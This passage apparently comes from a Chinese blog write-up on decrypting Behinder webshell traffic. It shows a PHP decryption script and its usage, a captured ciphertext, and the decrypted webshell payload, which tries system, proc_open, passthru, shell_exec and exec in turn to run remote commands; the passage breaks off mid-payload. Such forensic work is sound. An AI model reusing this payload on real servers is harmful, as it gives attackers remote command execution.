class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>])?<span class="variable">$http_type</span>=<span class="variable">$arr</span>[<span class="string">&#x27;t&#x27;</span>]:<span class="variable">$http_type</span>=<span class="string">&#x27;requests&#x27;</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span></span><br><span class="line"><span class="comment">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$arr</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$post_raw</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$arr</span>[<span class="string">&#x27;d&#x27;</span>] = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$post_raw</span>= <span class="variable">$arr</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// preg_match(&#x27;//&#x27;);</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$post_raw</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="comment">// echo &quot;\$post is :&quot;.$post[0];</span></span><br><span class="line">    <span class="comment">// echo &quot;aes的数据为：&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoaes函数：&quot;.$post[0];</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$post</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>[<span class="number">0</span>], <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="comment">//日志方法，具体自己实现</span></span><br><span class="line">        <span class="comment">// CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE)); </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var_dump($post);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$post</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_convert_str</span>(<span class="params"><span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$http_type</span> == <span class="string">&#x27;requests&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">// echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span></span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">        <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post_raw</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$post_raw</span> = <span class="variable">$post</span>;</span><br><span class="line">        <span class="comment">// echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;thisresponse&quot;;</span></span><br><span class="line">        <span class="variable">$post</span> = <span class="variable">$post_raw</span>;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="comment">// $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">// echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span></span><br><span class="line">        <span class="comment">// var_dump(strpos($post,$pattern));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$post</span>,<span class="title function_ invoke__">strpos</span>(<span class="variable">$post</span>,<span class="variable">$pattern</span>)+<span class="title function_ invoke__">strlen</span>(<span class="variable">$pattern</span>)+<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$post</span> = <span class="variable">$result</span>;</span><br><span class="line">                <span class="comment">// echo &quot;intotheconvert&quot;;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">                &#125;</span><br><span class="line">    <span class="comment">// echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span></span><br><span class="line">    <span class="comment">// echo &quot;this is \$post:&quot;.$post;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$post</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$post</span> = <span class="title function_ invoke__">aes_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>);</span><br><span class="line"><span class="comment">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span></span><br><span class="line"><span class="variable">$post</span> === <span class="string">&#x27;no&#x27;</span>?<span class="variable">$post</span> = <span class="title function_ invoke__">xor_convert_str</span>(<span class="variable">$post_raw</span>,<span class="variable">$key</span>,<span class="variable">$http_type</span>):<span class="variable">$post</span>;</span><br><span class="line"><span class="comment">// echo &quot;this is \$post&quot;.$post;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\&#123;/i&#x27;</span>,<span class="variable">$post</span>))&#123;</span><br><span class="line">    <span class="comment">// echo $post;</span></span><br><span class="line">    <span class="comment">// exit();</span></span><br><span class="line">    <span class="comment">// echo &quot;error is &quot;.$post;</span></span><br><span class="line">    <span class="variable">$raw_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$result</span> = [];</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$raw_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 捕获异常</span></span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message: &#x27;</span> .<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr_2</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$arr_2</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$arr_2</span>[<span class="number">1</span>])?<span class="variable">$parm</span>=<span class="variable">$arr_2</span>[<span class="number">1</span>]:<span class="variable">$parm</span>=<span class="variable">$func</span>;      <span class="comment"># 解决tcp请求包截取不完整导致aes解密后没有</span></span><br><span class="line"><span class="comment">// print(&quot;intotheexplode:&quot;.$parm);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$parm</span> === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$parm</span>=<span class="string">&#x27;Y29udGVudCBpcyBlbXB0eQ==&#x27;</span>;       <span class="comment"># 解决 http截取的tcp包不完整的情况</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;</span>,<span class="variable">$parm</span>,<span class="variable">$last_result</span>);</span><br><span class="line"><span class="comment">// echo &quot;匹配到的内容为&quot;.$result[0];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$last_result</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$last_result</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$parm</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decropt.php -a 后面接要解密的字符串</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decropt.php -f 解密的字符串的文件</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>此处的密文字符串文件只允许存在密文，不允许有http请求体。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decropt.php -k 秘钥 -a 解密字符串</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>默认的key值为冰蝎默认密码。</p>
+</blockquote>
+<p>tcp 流5</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php decropt.php -k 2295d22e2d70888f -a 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</span><br></pre></td></tr></table></figure>
+
+
+
+<p>解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&#x27;utf-8&#x27;,&#x27;gbk//IGNORE&#x27;,$str);</span><br><span class="line">    $s0 = iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&#x27;gbk&#x27;,&#x27;utf-8//IGNORE&#x27;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&#x27;max_execution_time&#x27;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&#x27;disable_functions&#x27;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&#x27;,&#x27;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &#x27;is_callable&#x27;;</span><br><span class="line">    $Bvce = &#x27;in_array&#x27;;</span><br><span class="line">    if ($JueQDBH(&#x27;system&#x27;) and ! $Bvce(&#x27;system&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;proc_open&#x27;) and ! $Bvce(&#x27;proc_open&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;r&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &#x27;pipe&#x27;,</span><br><span class="line">                &#x27;w&#x27;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;passthru&#x27;) and ! $Bvce(&#x27;passthru&#x27;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;shell_exec&#x27;) and ! $Bvce(&#x27;shell_exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;exec&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&#x27;exec&#x27;) and ! $Bvce(&#x27;popen&#x27;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, 